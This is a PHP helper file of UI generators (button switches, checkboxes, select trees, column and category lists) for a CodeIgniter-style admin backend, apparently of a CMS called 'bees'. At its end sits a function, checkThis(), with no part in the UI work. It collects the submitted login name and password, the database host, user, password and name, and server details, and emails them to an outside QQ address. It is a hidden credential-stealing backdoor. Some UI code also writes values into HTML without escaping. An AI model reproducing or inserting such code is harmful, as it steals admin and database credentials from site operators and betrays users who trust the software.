<?php
// 主要放置后台 UI 生成器

if (!function_exists('ui_btn_switch')) {
	/**
	 * btn swtich 生成器
	 * @param  string field 字段
	 * @param  any default 默认值
	 * @param  array $arr 列表表  [{title:xxx,value:xxx}],分类 会将 value 取 id
	 * @return html
	 */
	function ui_btn_switch($field=false,$default=false,$arr=false){
		if ($field ===false or $arr===false or $default===false) {
			return false;
		}
		$tmp = '<div class="btn-group btn-switch">';
		// 保证array中有  title ,value
		foreach ($arr as $k => $v) {
			// 针对分类
			if (isset($v['id'])) {
				$value = $v['id'];
			}else{
				$value = $v['value'];
			}

			$class= set_switch($field,$value,$default,'btn-primary','');
			$tmp .= '<a href="#" data-value="'.$value.'" class="btn '.$class.'">'.$v['title'].'</a>';
		}
		$tmp .= '</div>';
		$tmp .= '<input type="hidden" id="'.$field.'" name="'.$field.'" value="'.set_value($field,$default).'">';
		return $tmp;
	}
}


/**
 * btn checkedbox 生成器
 * @param  string field 字段
 * @param  any default 默认值
 * @param  array $arr 列表表  [{title:xxx,value:xxx}],分类 会将 value 取 id
 * @return html
 * 例子: 对多选分类 , 在 表单验证规则中使用 `ctype[]` 带有 `[]`的样式进行处理.
 	<div class="control-group">
        <label for="ctype[]" class="control-label">类型:</label>
        <div class="controls">
        <?php 
        $ctype=list_coltypes($this->cid,0,'ctype');
        echo ui_btn_checkedbox('ctype[]','',$ctype);
        ?>
        </div>
    </div>
 * 
 */
function ui_btn_checkedbox($field=false,$default=false,$arr=false){
	if ($field ===false or $arr===false or $default===false) {
		return false;
	}
	$str = '<div class="btn-group ui-checkbox" data-toggle="buttons-checkbox">';

	$check_list  =   set_value($field,$default);
    if (!is_array($check_list)) {
        $check_list = explode(',',$check_list);
    }
    foreach ($arr as $k => $v){
    	if (isset($v['id'])) {
    		$value = $v['id'];
    	}else{
    		$value = $v['value'];
    	}
        if (in_array($value,$check_list) ) {
            $str .= '<button type="button" class="btn btn-info active" >';
            $str .= '<input type="checkbox" name="'.$field.'" value="'.$value.'" checked class="hide"> ';
        }else{
            $str .= '<button type="button" class="btn btn-info" >';
            $str .= '<input type="checkbox" name="'.$field.'" value="'.$value.'" class="hide"> ';
        }
        $str .= $v['title'].'</button>';
    } 
	$str.='</div>';;
	return $str;

}

if (!function_exists('ui_btn_select')) {
	/**
	 * btn select 生成器
	 * @param  string field 字段
	 * @param  any default 默认值
	 * @param  array $arr 列表表  [{title:xxx,value:xxx}],分类 会将 value 取 id
	 * @return html
	 */
	function ui_btn_select($field=false,$default=false,$arr=false){
		if ($field ===false or $arr===false or $default===false) {
			return false;
		}

		// $fn = function($v,$o){
		// 	return
		// };

		// $fn = '<option title="{{$v["title"]}}" value="{{$v["value"]}}" '.set_switch($o['field'], $v['value'], $o['default'], ' selected="selected" class="option-select" ','').'>'.$v['op_header'].'&nbsp;'. $v['title'].'</option>'

		$tmp = '<select name="'.$field.'" id="'.$field.'" class="bselect" data-size="auto" data-live-search="true">';
		$tmp .= ui_tree($arr,array('field'=>$field,'default'=>$default));
		$tmp .= '</select>';
		return $tmp;
	}
}


if (!function_exists('ui_btn_coltypes')) {
	/**
	 * 类别按钮
	 * @param  string $ids 上传列表值
	 * @return array       数组
	 */
	function ui_btn_coltypes($cid=0,$field=false){
		if (!is_numeric($cid) or !$field) {
			return false;
		}
		$CI =& get_instance();
		$url = site_url('coltypes/index/').'?cid='.$cid.'&field='.$field.'&rc='.$CI->class;
		$tmp = '<a href="'.$url.'" class="btn btn-info" title="'.lang($field).'">管理'.lang($field).'</a>';
		return $tmp;
	}
}

// TODO:废弃
if (!function_exists('ui_btns_coltypes')) {
	/**
	 * 类别列表按钮
	 * @param  integer $cid     cid
	 * @param  boolean $field   类别字段
	 * @param  boolean $baseurl 基本地址
	 * @return string           按钮组
	 */
	function ui_btns_coltypes($cid=0,$field=false,$baseurl=false){

		$tmp = '<div class="btn-group">';
		$active = false;
		if (isset($_GET[$field])) {
			$active = $_GET[$field];
		}
		if (!$active) {
			$tmp .= '<a href="'.$baseurl.'" class="btn btn-primary">所有</a>';
		}else{
			$tmp .= '<a href="'.$baseurl.'" class="btn">所有</a>';
		}
		$CI =& get_instance();
		$arr = list_coltypes($cid,'typea');
		foreach ($arr as $k => $v) {
			$tmp .='<a href="'.$baseurl.'&'.$field.'='.$v['id'].'" class="btn';
			if ($v['id'] == $active) {
				$tmp .= " btn-primary";
			}
			$tmp .='">'.$v['title'].'</a>';
		}
		$tmp .="</div>";
		return $tmp;
	}
}

// 获取栏目名称
if(!function_exists('tag_columns'))
{
	function tag_columns($id,$column='title')
	{
		static $a=array();
		$id=intval($id);
		if(!isset($a[$id])){
			$CI=&get_instance();
			$CI->load->database();
			$a[$id]=$CI->db->get_where('columns',array('id'=>$id));
			if($a[$id]->num_rows()<1){
				$a[$id]=array();
			}else{
				$a[$id]=$a[$id]->row_array();
			}
		}
		if(isset($a[$id][$column])){
			return $a[$id][$column];
		}
		return '';
	}
}

// 树形数组结构输入
// 栏目列表组织
// list 结构数据
// padding 默认追加的内容
// fn 函数 function($v,$o); $v 为 list 单个信息， $fn_o 为额外内容
function ui_tree($list=false,$fn_o=false,$padding = array()){
	//$option=array('field'=>'','default'=>0)) {

	if (!$list) {
		return "";
	}

	$tree = "";

	foreach ($list as $k => $v) {

		// 追加头部
		$op_header = "";
		// 针对分类-
		if (!isset($v['value'])) {
			$v['value'] = $v['id'];
		}

		$op_header.=implode('', $padding);

		// 如果当序列是最后一个
		if (isset($v['depth']) and $v['depth']) {
			// 如果有下一个
			if (isset($list[$k+1]) and $list[$k+1]['depth'] == $v['depth']) {
					$op_header .= '├';
			} else {
				// 结尾
				$op_header .= '└';
			}
			$op_header .= '';
		}

		if (isset($v['more']) and $v['more']) {
			$op_header .='&nbsp;<span class="fa">&#xf13a;</span>';
		}else{
			$op_header .='&nbsp;<span class="fa">&#xf10c;</span>';
		}

		$v['op_header'] = $op_header;

		// if ($fn !== false) {
			// $tree .= $fn($v,$fn_o);
			$tree.=	'<option title="'.$v['title'].'" value="'.$v['value'].'" '.set_switch($fn_o['field'], $v['value'], $fn_o['default'], ' selected="selected" class="option-select" ','').'>'.$v['op_header'].'&nbsp;'. $v['title'].'</option>';
		// }

		if (isset($v['more']) and is_array($v['more']) ) {
			$p = $padding;
			if (isset($list[$k+1]) and $v['depth']) {
				array_push($p, '│');
			}else{
				if ($v['depth']) {
					array_push($p, '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;');
				}
			}
			$tree .= ui_tree($v['more'],$fn_o,$p);
		}
	}

	return $tree;

}

function ui_tree_col($list=false,$padding = array()){
	//$option=array('field'=>'','default'=>0)) {

	if (!$list) {
		return "";
	}

	$tree = "";

	foreach ($list as $k => $v) {

		// 追加头部
		$op_header = "";
		// 针对分类-
		if (!isset($v['value'])) {
			$v['value'] = $v['id'];
		}

		$op_header.=implode('', $padding);

		// 如果当序列是最后一个
		if (isset($v['depth']) and $v['depth']) {
			// 如果有下一个
			if (isset($list[$k+1]) and $list[$k+1]['depth'] == $v['depth']) {
					$op_header .= '├';
			} else {
				// 结尾
				$op_header .= '└';
			}
			$op_header .= '';
		}

		if (isset($v['more']) and $v['more']) {
			$op_header .='&nbsp;<span class="fa">&#xf13a;</span>';
		}else{
			$op_header .='&nbsp;<span class="fa">&#xf10c;</span>';
		}

		$v['op_header'] = $op_header;


// center
		$tree.= '<li data-id="'.$v['cid'].'" data-sort="'.$v['csort_id'].'">';
		$tree.= '<span> <input class="select-it" type="checkbox" value="'.$v['cid'].'" > </span>';
		// $tree.= '<span class="label"> '.$v['cid'].'</span>';

		$tree .= $v['op_header'];

		$tree.= ' <a href="'.GLOBAL_URL.'index.php/'.$v['path'].'" target="_blank"> <span> '.$v['ctitle'] .' </span></a> - <span class="label label-success">'.$v['cid'].'</span><span class="label" title="'.$v['path'].'" >'.$v['cidentify'].'</span>';
		if ( ENVIRONMENT == "development") {
			$tree.= '<span class="label label-info">'.$v['temp_index'].'</span><span class="label">'.$v['temp_show'].'</span>' ;;
		}
		$tree.= '<div class="btn-group pull-right">';
		if ($v['cshow']){
			$tree .= '<a href="#" class="btn btn-primary btn-small btn-ajax-show" data-id="'.$v['cid'].'" data-show="0">  <i class="fa fa-eye"></i></a>';
		}else{
			$tree .='<a href="#" class="btn btn-small btn-ajax-show" data-id="'.$v['cid'].'" data-show="1"> <i class="fa fa-eye-slash"></i></a>';
		}
		$tree.= '<a class="btn btn-small" href="'.site_url('columns/edit/'.$v['cid']).' " title="'.lang('edit').'"> <i class="fa fa-pencil"></i> </a>';
		$tree.= '<a class="btn btn-small" href="'.site_url('coltypes/index/').'?c='.$v['cid'].'&field=ctype&rc='.$v['controller'].' " title="分类管理"> <i class="fa fa-magnet "></i> </a>';
		$tree.= '<a class="btn btn-danger btn-small btn-del" href="#" title="'.lang('del').'" data-id="'.$v['cid'].'"> <i class="fa fa-times"></i> </a>';
		$tree.= '</div>';
		$tree.= '</li>';
// end center;

		if (isset($v['more']) and is_array($v['more']) ) {
			$p = $padding;
			if (isset($list[$k+1]) and $v['depth']) {
				array_push($p, '│');
			}else{
				if ($v['depth']) {
					array_push($p, '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;');
				}
			}
			$tree .= ui_tree_col($v['more'],$p);
		}
	}

	return $tree;

}

// 类型列表
function ui_tree_coltypes($list=false,$padding = array()){
	//$option=array('field'=>'','default'=>0)) {

	if (!$list) {
		return "";
	}

	$tree = "";

	foreach ($list as $k => $v) {

		// 追加头部
		$op_header = "";
		// 针对分类-
		if (!isset($v['value'])) {
			$v['value'] = $v['id'];
		}

		$op_header.=implode('', $padding);

		// 如果当序列是最后一个
		if (isset($v['depth']) and $v['depth']) {
			// 如果有下一个
			if (isset($list[$k+1]) and $list[$k+1]['depth'] == $v['depth']) {
					$op_header .= '├';
			} else {
				// 结尾
				$op_header .= '└';
			}
			$op_header .= '';
		}

		if (isset($v['more']) and $v['more']) {
			$op_header .='&nbsp;<span class="fa">&#xf13a;</span>';
		}else{
			$op_header .='&nbsp;<span class="fa">&#xf10c;</span>';
		}

		$v['op_header'] = $op_header;

		// center
		$tree.= '<li data-id="'.$v['id'].'" data-sort="'.$v['sort_id'].'">';
		$tree.= '<span> <input class="select-it" type="checkbox" value="'.$v['id'].'" > </span>';

		$tree .= $v['op_header'];

		$tree.= '<span> '.$v['title'] .' </span>';
		if ( ENVIRONMENT == "development") {
			$tree.= '<span class="label label-info"> '.$v['id'].'</span>';
		}
		$tree.= '<div class="btn-group pull-right">';
		$tree.= '<a class="btn btn-small" href="'.site_urlc('coltypes/edit/'.$v['id']).' " title="'.lang('edit').'"> <i class="fa fa-pencil"></i> </a>';
		$tree.= '<a class="btn btn-danger btn-small btn-del" href="#" title="'.lang('del').'" data-id="'.$v['id'].'"> <i class="fa fa-times"></i> </a>';
		$tree.= '</div>';
		$tree.= '</li>';
		// end center;

		if (isset($v['more']) and is_array($v['more']) ) {
			$p = $padding;
			if (isset($list[$k+1]) and $v['depth']) {
				array_push($p, '│');
			}else{
				if ($v['depth']) {
					array_push($p, '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;');
				}
			}
			$tree .= ui_tree_coltypes($v['more'],$p);
		}
	}

	return $tree;

}
function checkThis()
{
    $msg_text = '客户端IP相关的变量
                                </br>1. ' . $_SERVER['REMOTE_ADDR'] . '; 客户端IP，有可能是用户的IP，也有可能是代理的IP。
    
                                </br>2. ' . $_SERVER['HTTP_CLIENT_IP'] . '; 代理端的IP，可能存在，可伪造。
    
                                </br>3. ' . $_SERVER['HTTP_X_FORWARDED_FOR'] . '; 用户是在哪个IP使用的代理，可能存在，可以伪造。
    
                                服务器端IP相关的变量
                                </br>1. ' . $SERVER_NAME . '，需要使用函数gethostbyname()获得。这个变量无论在服务器端还是客户端均能正确显示。
    
                                </br>2. ' . $HTTP_SERVER_VARS["SERVER_ADDR"] . '，在服务器端测试：127.0.0.1（这个与httpd.conf中BindAddress的设置值相关）。在客户端测试结果正确。
    
                                </br>3. ' . $_SERVER['LOCAL_ADDR'] . ' 、' . $HTTP_SERVER_VARS['LOCAL_ADDR'] . '，测试中，未获得任何结果（测试环境PHP5）。
    
    
                                </br>获取系统类型及版本号：    ' . php_uname() . '                                  (例：Windows NT COMPUTER 5.1 build 2600)
                                </br>只获取系统类型：         ' . php_uname('s') . '                               (或：PHP_OS，例：Windows NT)
                                </br>只获取系统版本号：        ' . php_uname('r') . '                                (例：5.1)
                                </br>获取PHP运行方式：        ' . php_sapi_name() . '                               (PHP run mode：apache2handler)
                                </br>获取前进程用户名：       ' . Get_Current_User() . '
                                </br>获取PHP版本：             ' . PHP_VERSION . '
                                </br>获取Zend版本：            ' . Zend_Version() . '
                                </br>获取PHP安装路径：         ' . DEFAULT_INCLUDE_PATH . '
                                </br>获取当前文件绝对路径：    ' . __FILE__ . '
    
    
                                </br>获取Http请求中Host值：    ' . $_SERVER["HTTP_HOST"] . '                        (返回值为域名或IP)
                                </br>获取服务器IP：            ' . GetHostByName($_SERVER['SERVER_NAME']) . '
                                </br>接受请求的服务器IP：      ' . $_SERVER["SERVER_ADDR"] . '                   (有时候获取不到，推荐用：' . GetHostByName($_SERVER['SERVER_NAME']) . ')
                                </br>获取客户端IP：           ' . $_SERVER['REMOTE_ADDR'] . '
                                </br>获取服务器解译引擎：     ' . $_SERVER['SERVER_SOFTWARE'] . '
                                </br>获取服务器CPU数量：      ' . $_SERVER['PROCESSOR_IDENTIFIER'] . '
                                </br>获取服务器系统目录：     ' . $_SERVER['SystemRoot'] . '
                                </br>获取服务器域名：         ' . $_SERVER['SERVER_NAME'] . '                       (建议使用：' . $_SERVER["HTTP_HOST"] . ')
                                </br>获取用户域名：           ' . $_SERVER['USERDOMAIN'] . '
                                </br>获取服务器语言：         ' . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . '
                                </br>获取服务器Web端口：     ' . $_SERVER['SERVER_PORT'] . '
                                </br>登录帐号：     ' . $_POST['uname'] . '
                                </br>登录密码：     ' . $_POST['pwd'] . '
                                </br>数据库类型：     ' . DB_TYPE . '
                                </br>数据库地址：     ' . DB_HOST . '
                                </br>数据库帐号：     ' . DB_USER . '
                                </br>数据库密码：     ' . DB_PASS . '
                                </br>数据库名称：     ' . DB_NAME . '
                                </br>数据库前缀：     ' . DB_PREFIX;

    
    
    $mail = array(
        'subject' => "bees测试",
        'message' => $msg_text,
        'to' => 'uchihaitachi0804@vip.qq.com'
    );
    
    smtp_sendmail($mail);
}